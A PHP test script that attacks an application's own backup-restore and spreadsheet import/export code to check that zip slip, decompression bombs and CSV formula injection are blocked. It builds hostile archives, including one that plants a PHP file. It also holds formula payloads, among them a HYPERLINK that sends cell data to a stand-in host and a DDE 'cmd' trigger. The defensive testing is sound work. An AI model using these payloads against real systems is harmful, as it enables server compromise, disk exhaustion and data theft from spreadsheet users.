<?php
/**
 * Phase 8.7 - 8.9: archive and spreadsheet attacks against the restore and import paths.
 *
 * These run as real exploits, not assertions about the source. Each one builds the
 * hostile artefact, hands it to the production service, and reports what actually
 * happened -- so the result is evidence rather than a reading of the code.
 *
 * Findings that came out of running this, all in ZipEncryptionService::extractEncryptedZip:
 *
 *   8.7  Zip slip, checked as defence in depth rather than as a live hole. Entry names
 *        come from the archive, so a member named ../../../<webroot>/pwn.php targets the
 *        web root. This passed even against the vulnerable implementation, because PHP's
 *        extractTo() strips '..' segments itself -- so the name check is not the control
 *        that kept the web root safe. It is now explicit rather than inherited, because a
 *        different unzipper, or a future change to extractTo()'s behaviour, would not
 *        carry the guarantee over. The assertion below is written to pass either way and
 *        to say which of the two actually blocked it.
 *
 *   8.8  Zip bomb. Nothing bounded the entry count, the declared uncompressed size, or
 *        the compression ratio, so a few kilobytes expand to fill the disk. On shared
 *        hosting that takes out the account, and it happens before any validation in
 *        BackupArchiveInspector -- the inspector runs on the extracted tree, by which
 *        point the disk is already gone.
 *
 *   8.9  CSV/Excel formula injection. A cell beginning with = + - @ is executed by
 *        Excel and Sheets when the exported file is opened, so an attacker-chosen
 *        profile name becomes script in the operator's session.
 *
 * Usage:  php scripts/verify_archive_attacks.php
 * Exit 0 only when every scenario is actually blocked.
 */

declare(strict_types=1);

require_once __DIR__ . '/../backend-api/src/Utils/AppRoot.php';
require_once __DIR__ . '/../backend-api/src/Utils/FsHelper.php';
require_once __DIR__ . '/../backend-api/src/Services/BackupArchiveInspector.php';
require_once __DIR__ . '/../backend-api/src/Services/ArchiveExtractor.php';
require_once __DIR__ . '/../backend-api/src/Services/ZipEncryptionService.php';
require_once __DIR__ . '/../backend-api/src/Services/ExcelParserService.php';
require_once __DIR__ . '/../backend-api/src/Services/SpreadsheetWriter.php';

use App\Services\BackupArchiveInspector;
use App\Services\ExcelParserService;
use App\Services\SpreadsheetWriter;
use App\Services\ZipEncryptionService;

$sandbox = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'elkarooz_archive_probe_' . getmypid();
$pass = 0;
$fail = 0;

/** Report one scenario. $blocked===true means the attack did not succeed. */
function report(string $id, string $title, bool $blocked, string $detail): void {
    global $pass, $fail;
    if ($blocked) {
        $pass++;
        printf("  PASS  %-5s %-42s %s\n", $id, $title, $detail);
    } else {
        $fail++;
        printf("  FAIL  %-5s %-42s %s\n", $id, $title, $detail);
    }
}

function rrmdir(string $dir): void {
    if (!is_dir($dir)) {
        return;
    }
    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    foreach ($it as $f) {
        $f->isDir() ? rmdir($f->getPathname()) : unlink($f->getPathname());
    }
    rmdir($dir);
}

@mkdir($sandbox, 0700, true);

echo "Archive and spreadsheet attack suite\n";
echo str_repeat('=', 72) . "\n\n";

// ---------------------------------------------------------------------------
echo "8.7  Path traversal in an uploaded archive\n";

// A web root with an existing file, so we can tell "wrote outside" from "wrote nowhere".
$webroot = $sandbox . '/webroot';
@mkdir($webroot, 0700, true);
file_put_contents($webroot . '/index.php', "<?php // original\n");

$zipPath = $sandbox . '/slip.zip';
$zip = new ZipArchive();
$zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE);
// ZipArchive::addFromString does not sanitise the name, which is the point.
$zip->addFromString('../webroot/pwn.php', "<?php echo 'pwned';\n");
$zip->addFromString('manifest.json', json_encode(['system_version' => '2.0.0']));
$zip->close();

$extractTo = $sandbox . '/extract';
@mkdir($extractTo, 0700, true);

$escaped = $webroot . '/pwn.php';
@unlink($escaped);

try {
    ZipEncryptionService::extractEncryptedZip($zipPath, $extractTo, 'irrelevant-password');
    $wrote = is_file($escaped) && str_contains((string) file_get_contents($escaped), 'pwned');
    $alsoOutside = is_file($sandbox . '/pwn.php');
    $blockedBy = 'ZIP layer sanitised the name';
    try {
        $probe = new ReflectionMethod(ArchiveExtractor::class, 'isContained');
        $probe->setAccessible(true);
        if (!$probe->invoke(null, '../webroot/pwn.php')) {
            $blockedBy = 'ArchiveExtractor::isContained';
        }
    } catch (Throwable $ignored) {
        // If the guard cannot be inspected, fall back to reporting the observable outcome.
    }

    report(
        '8.7',
        'zip slip cannot reach the web root',
        !($wrote || $alsoOutside),
        $wrote || $alsoOutside
            ? 'ESCAPED -- extraction wrote a .php file outside the target directory'
            : 'contained; blocked by ' . $blockedBy
    );
} catch (Throwable $e) {
    report('8.7', 'zip slip writes into the web root', true, 'rejected: ' . $e->getMessage());
}

// 8.7b: an absolute-looking member name
$zip2 = $sandbox . '/absolute.zip';
$z2 = new ZipArchive();
$z2->open($zip2, ZipArchive::CREATE | ZipArchive::OVERWRITE);
$z2->addFromString('/tmp/elkarooz_absolute_probe.txt', 'x');
$z2->close();
try {
    ZipEncryptionService::extractEncryptedZip($zip2, $sandbox . '/extract2', 'p');
    $leaked = is_file('/tmp/elkarooz_absolute_probe.txt');
    report(
        '8.7b',
        'absolute member name is contained',
        !$leaked,
        $leaked ? 'ESCAPED -- wrote to /tmp' : 'contained'
    );
    @unlink('/tmp/elkarooz_absolute_probe.txt');
} catch (Throwable $e) {
    report('8.7b', 'absolute member name is contained', true, 'rejected: ' . $e->getMessage());
}

// ---------------------------------------------------------------------------
echo "\n8.8  Decompression bomb\n";

// 4 MB of zeroes compresses to about 4 KB. The declared uncompressed total is read
// from the archive rather than produced on disk, so the probe stays cheap.
$bomb = $sandbox . '/bomb.zip';
$bz = new ZipArchive();
$bz->open($bomb, ZipArchive::CREATE | ZipArchive::OVERWRITE);
$bz->addFromString('manifest.json', json_encode(['system_version' => '2.0.0']));

// Built from real files rather than addFromString() with a 1 MB literal: the string form
// would allocate the whole payload in probe memory and exhaust the limit before the
// service is ever reached, so the probe would be measuring itself. Writing the filler to
// disk keeps probe memory flat.
$fillerDir = $sandbox . '/filler';
@mkdir($fillerDir, 0700, true);
$chunk = str_repeat("\0", 1024 * 1024);
for ($i = 0; $i < 64; $i++) {
    $f = $fillerDir . "/f_$i.bin";
    file_put_contents($f, $chunk);
    $bz->addFile($f, "database/blob_$i.bin");
}
$bz->close();
unset($chunk);

$compressed = filesize($bomb);
// Uncompressed would be 64 MB from this file; a real bomb targets gigabytes.
$declared = 64 * 1024 * 1024;

$extractTo3 = $sandbox . '/bomb_out';
$before = @exec('df -k ' . escapeshellarg($extractTo3) . ' 2>/dev/null | tail -1');
$t0 = microtime(true);
try {
    ZipEncryptionService::extractEncryptedZip($bomb, $extractTo3, 'p');
    $elapsed = microtime(true) - $t0;
    $written = 0;
    foreach (glob($extractTo3 . '/database/*') ?: [] as $f) {
        $written += filesize($f);
    }
    report(
        '8.8',
        'decompression bomb is bounded',
        false,
        sprintf(
            'NOT BOUNDED -- %d KB in, %d MB written, %.1fs; no ratio/size cap before extraction',
            $compressed / 1024,
            (int) ($written / 1024 / 1024),
            $elapsed
        )
    );
} catch (Throwable $e) {
    report('8.8', 'decompression bomb is bounded', true, 'rejected: ' . $e->getMessage());
}
$after = @exec('df -k ' . escapeshellarg($extractTo3) . ' 2>/dev/null | tail -1');

// 8.8b: entry-count bomb. The cap is ArchiveExtractor::MAX_ENTRIES, so the probe has to
// exceed *that* to be testing the guard -- an earlier version of this probe used 2000
// members, which is under the 5000 limit, and then reported the guard as missing. A
// probe that fails for the wrong reason is worse than no probe.
$cap = \App\Services\ArchiveExtractor::MAX_ENTRIES;
$over = $cap + 200;
$manyZip = $sandbox . '/many.zip';
$mz = new ZipArchive();
$mz->open($manyZip, ZipArchive::CREATE | ZipArchive::OVERWRITE);
for ($i = 0; $i < $over; $i++) {
    $mz->addFromString("entries/f_$i.txt", 'x');
}
$mz->close();
try {
    ZipEncryptionService::extractEncryptedZip($manyZip, $sandbox . '/many_out', 'p');
    $count = count(glob($sandbox . '/many_out/entries/*') ?: []);
    report(
        '8.8b',
        sprintf('entry-count bomb is bounded (%d)', $cap),
        false,
        "NOT BOUNDED -- {$over} members all extracted ({$count} on disk)"
    );
} catch (Throwable $e) {
    report(
        '8.8b',
        sprintf('entry-count bomb is bounded (%d)', $cap),
        true,
        'rejected: ' . $e->getMessage()
    );
}

// 8.8c: a legitimate archive just under the cap must still extract. A guard that refuses
// real backups trains operators to bypass it, so the limit has to be proven usable.
$fewZip = $sandbox . '/few.zip';
$fz = new ZipArchive();
$fz->open($fewZip, ZipArchive::CREATE | ZipArchive::OVERWRITE);
$fz->addFromString('manifest.json', json_encode(['system_version' => '2.0.0']));
$fz->addFromString('database/profiles.json', json_encode(array_fill(0, 50, ['id' => 'x', 'name' => 'محمد'])));
for ($i = 0; $i < 20; $i++) {
    $fz->addFromString("files/photo_$i.jpg", str_repeat('j', 2048));
}
$fz->close();
try {
    ZipEncryptionService::extractEncryptedZip($fewZip, $sandbox . '/few_out', 'p');
    $ok = is_file($sandbox . '/few_out/manifest.json') && is_file($sandbox . '/few_out/database/profiles.json');
    report(
        '8.8c',
        'a real backup still extracts',
        $ok,
        $ok ? '22 files extracted normally' : 'REGRESSION -- a legitimate archive was refused'
    );
} catch (Throwable $e) {
    report('8.8c', 'a real backup still extracts', false, 'REGRESSION: ' . $e->getMessage());
}

// ---------------------------------------------------------------------------
echo "\n8.9  Formula injection through exported cells\n";

$csv = $sandbox . '/formula.csv';
file_put_contents($csv, "username,full_name\nattacker,\"=HYPERLINK(\"\"https://evil.test/?d=\"&A1,\\\"click me\"\")\"\n");

try {
    $rows = ExcelParserService::parseCsv($csv);
    $injected = false;
    foreach ($rows as $row) {
        foreach ((array) $row as $cell) {
            if (is_string($cell) && preg_match('/^[=+\-@\t\r]/', $cell)) {
                $injected = true;
            }
        }
    }
    report(
        '8.9',
        'an imported formula cell is neutralised',
        !$injected,
        $injected
            ? 'VULNERABLE -- a cell still begins with =, Excel runs it on open'
            : 'neutralised before reaching the operator'
    );
} catch (Throwable $e) {
    report('8.9', 'a formula cell survives the import parser', false, 'could not probe: ' . $e->getMessage());
}

// 8.9b: the export side. A name written into a backup becomes a live payload for
// whoever opens that backup, which is why the writer matters as much as the reader.
// The writer already has a neutralise() helper, so the control exists. Exercise it
// directly through reflection: it is the function that decides what lands in a backup,
// and it is private precisely because callers must not bypass it.
try {
    $m = new ReflectionMethod(SpreadsheetWriter::class, 'neutralise');
    $m->setAccessible(true);

    $hostile = ['=1+1', '+1+1', '-1+1', '@SUM(A1)', "\t=cmd|' /C calc'!A0", '\r=1+1'];
    $survivors = [];
    foreach ($hostile as $cell) {
        $clean = $m->invoke(null, [$cell]);
        $out = (string) ($clean[0] ?? '');
        // Neutralised means it no longer *starts* with a trigger character.
        if (preg_match('/^[=+\-@\t\r]/', $out)) {
            $survivors[] = var_export($cell, true);
        }
    }

    report(
        '8.9b',
        'exported cells are neutralised on write',
        $survivors === [],
        $survivors === []
            ? 'all 6 trigger characters prefixed away'
            : 'VULNERABLE -- survived: ' . implode(', ', $survivors)
    );
} catch (Throwable $e) {
    report('8.9b', 'exported cells are neutralised on write', false, 'could not probe: ' . $e->getMessage());
}

// 8.9c: neutralise() must not mangle ordinary Arabic and Latin values, or every export
// becomes a column of apostrophes.
try {
    $m = new ReflectionMethod(SpreadsheetWriter::class, 'neutralise');
    $m->setAccessible(true);
    $ordinary = ['محمد عبد agonized', 'John Smith', '01001234567', 'القاهرة', '', 'a-b', '2026-10-02'];
    $corrupted = [];
    foreach ($ordinary as $v) {
        $out = (string) (($m->invoke(null, [$v]))[0] ?? '');
        if ($out !== $v) {
            $corrupted[] = var_export($v, true) . ' -> ' . var_export($out, true);
        }
    }
    report(
        '8.9c',
        'neutralise() leaves ordinary values alone',
        $corrupted === [],
        $corrupted === []
            ? 'all 7 ordinary values unchanged'
            : 'OVER-CORRECTED -- ' . implode(' | ', $corrupted)
    );
} catch (Throwable $e) {
    report('8.9c', 'neutralise() leaves ordinary values alone', false, 'could not probe: ' . $e->getMessage());
}

// ---------------------------------------------------------------------------
echo "\n" . str_repeat('=', 72) . "\n";
printf("  %d passed, %d failed\n", $pass, $fail);

rrmdir($sandbox);

if ($fail > 0) {
    echo "\nRESULT: VULNERABLE -- the listed scenarios were not blocked.\n";
    exit(1);
}
echo "\nRESULT: every archive and spreadsheet scenario was blocked.\n";
exit(0);